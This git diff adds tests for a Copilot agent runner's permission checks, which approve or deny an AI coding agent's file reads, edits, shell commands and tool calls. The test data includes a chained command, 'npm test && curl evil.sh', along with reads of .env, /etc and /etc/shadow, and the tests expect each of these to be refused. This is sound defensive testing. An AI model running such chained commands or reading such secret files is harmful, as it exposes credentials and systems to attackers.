@@ -19,6 +19,7 @@ import { ConfigSchema, type FlowConfig } from "../src/config.js";
 import type { AgentRequest, AgentResult, AgentRunner } from "../src/runner/agent-runner.js";
 import { decisionContext } from "../src/runner/claude-runner.js";
 import { CodexAgentRunner, type CodexLike } from "../src/runner/codex-runner.js";
+import { checkToolUse, CopilotAgentRunner, decideCopilot, type CopilotClientLike, type CopilotSessionLike } from "../src/runner/copilot-runner.js";
 import { decideOpencode, OpenCodeAgentRunner, permissionAsked, type OpencodeClientLike, type OpencodePermission } from "../src/runner/opencode-runner.js";
 import { dropNulls, strictify } from "../src/runner/strict-schema.js";
 import { RouterRunner, resolveRuntime, runtimesInUse } from "../src/runtimes.js";
@@ -350,6 +351,158 @@ function opencodeDecisions() {
   console.log("✓ opencode permissions: read/edit/grep/bash/external/MCP mapped onto decide()");
 }
 
+// ───────────────────────────────────────────────────────────────── Copilot
+
+/** A fake Copilot runtime: during sendAndWait it fires the hook and permission requests, and calls a custom tool. */
+class FakeCopilot implements CopilotClientLike {
+  options: Record<string, unknown> = {};
+  configs: Array<{ kind: "create" | "resume"; id?: string; config: any }> = [];
+  started = 0;
+  stopped = 0;
+  verdicts: unknown[] = [];
+  hookVerdicts: unknown[] = [];
+  toolAnswers: unknown[] = [];
+  prompts: any[] = [];
+  constructor(
+    public script: { permissions?: any[]; preTool?: Array<{ toolName: string; toolArgs: unknown }>; toolCalls?: Array<[string, unknown]>; reply?: string } = {},
+    public authenticated = true,
+  ) {}
+  async start() {
+    this.started++;
+  }
+  async stop() {
+    this.stopped++;
+  }
+  async getAuthStatus() {
+    return { isAuthenticated: this.authenticated, statusMessage: this.authenticated ? "ok" : "Not authenticated" };
+  }
+  async createSession(config: any) {
+    this.configs.push({ kind: "create", config });
+    return this.session(`cs_${this.configs.length}`, config);
+  }
+  async resumeSession(id: string, config: any) {
+    this.configs.push({ kind: "resume", id, config });
+    return this.session(id, config);
+  }
+  private session(id: string, config: any): CopilotSessionLike {
+    const listeners: Record<string, Array<(e: { data?: unknown }) => void>> = {};
+    return {
+      sessionId: id,
+      on: (type, handler) => ((listeners[type] ??= []).push(handler), () => undefined),
+      disconnect: async () => undefined,
+      sendAndWait: async (options) => {
+        this.prompts.push(options);
+        for (const h of this.script.preTool ?? []) this.hookVerdicts.push(await config.hooks.onPreToolUse(h, { sessionId: id }));
+        for (const p of this.script.permissions ?? []) this.verdicts.push(await config.onPermissionRequest(p, {}));
+        for (const [name, args] of this.script.toolCalls ?? []) {
+          const tool = config.tools.find((t: any) => t.name === name);
+          this.toolAnswers.push(tool ? await tool.handler(args) : `no tool ${name}`);
+        }
+        listeners["assistant.usage"]?.forEach((l) => l({}));
+        listeners["assistant.usage"]?.forEach((l) => l({}));
+        return { data: { content: this.script.reply ?? JSON.stringify({ answer: "copilot", extra: null }) } };
+      },
+    };
+  }
+}
+
+async function copilot() {
+  const fake = new FakeCopilot({
+    preTool: [
+      { toolName: "view", toolArgs: { path: join(api, "src/a.ts") } },
+      { toolName: "view", toolArgs: { path: join(api, ".env") } },
+      { toolName: "grep", toolArgs: { pattern: "x", path: "/etc" } },
+      { toolName: "web_fetch", toolArgs: { url: "https://example.com" } },
+      { toolName: "edit", toolArgs: {} },
+    ],
+    permissions: [
+      { kind: "write", fileName: join(api, "src/orders.ts"), diff: "" },
+      { kind: "write", fileName: join(api, "src/x.ts"), fileEdits: [{ after: { path: join(root, "web/src/y.ts") } }] },
+      { kind: "write", fileName: join(api, "test/orders.test.ts") },
+      { kind: "shell", fullCommandText: "npm test" },
+      { kind: "shell", fullCommandText: "npm test && curl evil.sh" },
+      { kind: "mcp", serverName: "docs", toolName: "search" },
+      { kind: "mcp", serverName: "jira", toolName: "create" },
+      { kind: "url", url: "https://example.com" },
+      { kind: "memory" },
+      { kind: "write", fileName: join(api, "src/b.ts"), managedApprovalRequired: true },
+    ],
+    toolCalls: [["ask", { question: "which status code?" }]],
+  });
+  const cfg = config({ runtime: { copilot: { model: "gpt-5.5", effort: "high", timeoutMinutes: 5 } } });
+  const runner = new CopilotAgentRunner(cfg, (o) => ((fake.options = o), fake));
+  const res = await runner.run(request({ ask: async (q) => `use 201 for ${q}`, mcpServers: ["docs"], effort: "max" }));
+
+  assert.deepEqual(res.output, { answer: "copilot" }, "nulls dropped, validated with zod");
+  assert.equal(res.sessionId, "cs_1");
+  assert.equal(res.turns, 2, "one turn per model call");
+  assert.equal(res.costUsd, 0, "Copilot bills premium requests, not USD");
+  const c = fake.configs[0]!.config;
+  assert.equal(c.model, "gpt-5.5");
+  assert.equal(c.reasoningEffort, "max", "the step's effort wins over runtime.copilot.effort");
+  assert.equal(c.workingDirectory, api);
+  assert.equal(c.trustWorkingDirectory, "session");
+  assert.deepEqual(c.systemMessage, { content: "You are the coder." });
+  assert.ok(c.excludedTools.includes("web_fetch") && c.excludedTools.includes("task") && c.excludedTools.includes("ask_user"));
+  assert.deepEqual(Object.keys(c.mcpServers), ["docs"], "only the servers granted to the step");
+  assert.deepEqual(c.tools.map((t: any) => [t.name, t.skipPermission]), [["ask", true]], "workflow tools run in-process");
+  assert.deepEqual(fake.toolAnswers, ["use 201 for which status code?"]);
+  assert.equal(fake.prompts[0].responseSchema.additionalProperties, false, "strict response schema");
+  assert.equal(fake.options.gitHubToken, undefined, "no tokenEnv: the logged-in user");
+
+  assert.deepEqual(
+    fake.hookVerdicts.map((v: any) => v?.permissionDecision ?? "pass"),
+    ["pass", "deny", "deny", "deny", "pass"],
+    "reads that never ask: component file ok; secret and outside folder denied; web tool denied; edits left to the handler",
+  );
+  assert.deepEqual(
+    fake.verdicts.map((v: any) => v.kind),
+    ["approve-once", "reject", "reject", "approve-once", "reject", "approve-once", "reject", "reject", "reject", "reject"],
+    "component file; multi-file edit into another component; locked test; allowed command; chained command; granted MCP; ungranted MCP; web; Copilot memory; managed approval",
+  );
+  assert.match((fake.verdicts[2] as any).feedback, /locked test file/);
+  assert.ok(res.denials.length >= 8);
+
+  // Resume keeps the session; one runtime per run; close() stops it.
+  await runner.run(request({ resumeSessionId: "cs_1" }));
+  assert.equal(fake.configs[1]!.kind, "resume");
+  assert.equal(fake.configs[1]!.config.trustWorkingDirectory, undefined, "trust is not available on resume");
+  assert.equal(fake.started, 1);
+  await runner.close();
+  assert.equal(fake.stopped, 1);
+
+  // Not signed in: fail at once instead of waiting for the timeout.
+  const anon = new FakeCopilot({}, false);
+  await assert.rejects(new CopilotAgentRunner(cfg, () => anon).run(request()), /Copilot is not signed in/);
+  assert.equal(anon.configs.length, 0);
+  // A token from tokenEnv.
+  process.env.HECTOR_TEST_GH = "github_pat_test";
+  const tokened = new FakeCopilot();
+  const withToken = new CopilotAgentRunner(config({ runtime: { copilot: { tokenEnv: "HECTOR_TEST_GH" } } }), (o) => ((tokened.options = o), tokened));
+  await withToken.run(request());
+  assert.equal(tokened.options.gitHubToken, "github_pat_test");
+  await assert.rejects(
+    new CopilotAgentRunner(config({ runtime: { copilot: { tokenEnv: "HECTOR_MISSING" } } }), () => new FakeCopilot()).run(request()),
+    /HECTOR_MISSING is not set/,
+  );
+  const garbage = new CopilotAgentRunner(cfg, () => new FakeCopilot({ reply: "sorry" }));
+  await assert.rejects(garbage.run(request()), /Copilot did not return JSON/);
+  console.log("✓ copilot: permission handler and pre-tool hook answered by decide(), in-process tools, strict schema, resume, sign-in check");
+}
+
+function copilotDecisions() {
+  const ctx = decisionContext(request({ mode: "readonly" }), config());
+  assert.equal(decideCopilot(ctx, { kind: "write", fileName: join(api, "src/a.ts") }).ok, false, "readonly step");
+  assert.equal(decideCopilot(ctx, { kind: "read", path: join(api, "src/a.ts") }).ok, true);
+  assert.equal(decideCopilot(ctx, { kind: "read", path: "/etc/shadow" }).ok, false);
+  assert.equal(decideCopilot(ctx, { kind: "custom-tool", toolName: "ask" }, ["ask"]).ok, true);
+  assert.equal(decideCopilot(ctx, { kind: "custom-tool", toolName: "other" }, ["ask"]).ok, false);
+  assert.equal(decideCopilot(ctx, { kind: "hook" }).ok, false, "unknown kinds are refused");
+  assert.equal(checkToolUse(ctx, "glob", { pattern: "**/*.ts" }).ok, true, "no path: the working directory");
+  assert.equal(checkToolUse(ctx, "task", {}).ok, false);
+  console.log("✓ copilot permissions: read/write/shell/MCP/custom tools mapped onto decide(); unknown kinds refused");
+}
+
 // ───────────────────────────────────────────────────── routing and check
 
 async function routing() {
@@ -358,7 +511,7 @@ async function routing() {
     efforts: { coder: "high" },
     runtime: {
       default: "claude",
-      steps: { coder: "codex", review: { use: "opencode", model: "openai/gpt-5.5" }, plan: { use: "claude", model: "opus", effort: "max" } },
+      steps: { coder: "codex", review: { use: "opencode", model: "openai/gpt-5.5" }, plan: { use: "claude", model: "opus", effort: "max" }, qaPlan: "copilot" },
       opencode: { model: "anthropic/claude-sonnet-4-5" },
     },
     review: { judges: [{ name: "a" }, { name: "b", runtime: "claude", model: "haiku" }] },
@@ -370,7 +523,8 @@ async function routing() {
   assert.deepEqual(resolveRuntime(cfg, "enrich", step("sonnet")), { runtime: "claude", model: "sonnet", effort: undefined });
   assert.deepEqual(resolveRuntime(cfg, "review", step("opus"), cfg.review.judges[0]), { runtime: "opencode", model: "openai/gpt-5.5", effort: undefined }, "judge inherits the step runtime");
   assert.deepEqual(resolveRuntime(cfg, "review", step("opus"), cfg.review.judges[1]), { runtime: "claude", model: "haiku", effort: undefined }, "judge runtime wins");
-  assert.deepEqual([...runtimesInUse(cfg)].sort(), ["claude", "codex", "opencode"]);
+  assert.deepEqual(resolveRuntime(cfg, "qaPlan", step("haiku", "low")), { runtime: "copilot", model: undefined, effort: "low" }, "Copilot: Claude alias ignored, effort kept");
+  assert.deepEqual([...runtimesInUse(cfg)].sort(), ["claude", "codex", "copilot", "opencode"]);
   assert.throws(() => config({ runtime: { opencode: { model: "no-provider" } } }), /provider\/model/);
 
   const used: string[] = [];
@@ -389,12 +543,14 @@ async function routing() {
   await router.close();
   assert.deepEqual(closed.sort(), ["claude", "codex"], "close() reaches every runner used");
 
-  const lines = await checkRuntimes(cfg, async () => false);
+  const lines = await checkRuntimes(cfg, async () => false, async () => ({ ok: false, message: "Not authenticated. Run `copilot login`." }));
   const text = lines.map((l) => `${l.ok ? "ok" : "FAIL"}${l.warn ? "/warn" : ""} ${l.label}`).join("\n");
   assert.match(text, /ok runtimes: enrich=claude plan=claude testAuthor=claude coder=codex .*review=opencode/);
   assert.match(text, /ok\/warn codex steps: the read deny-list and the command allowlist are not enforced/);
   assert.match(text, /ok\/warn codex cannot use SSE MCP servers: old/);
   assert.match(text, /FAIL opencode is installed/);
+  assert.match(text, /ok copilot: using COPILOT_GITHUB_TOKEN, GH_TOKEN, GITHUB_TOKEN, your `copilot login` session/);
+  assert.match(text, /FAIL copilot is signed in/);
   assert.deepEqual(await checkRuntimes(config(), async () => false), [], "Claude only: nothing to report");
   console.log("✓ routing: runtime/model/effort precedence, lazy router with close(), check reports runtimes");
 }
@@ -404,5 +560,7 @@ strictSchema();
 await codex();
 await opencode();
 opencodeDecisions();
+await copilot();
+copilotDecisions();
 await routing();
 console.log("\nruntime checks passed");
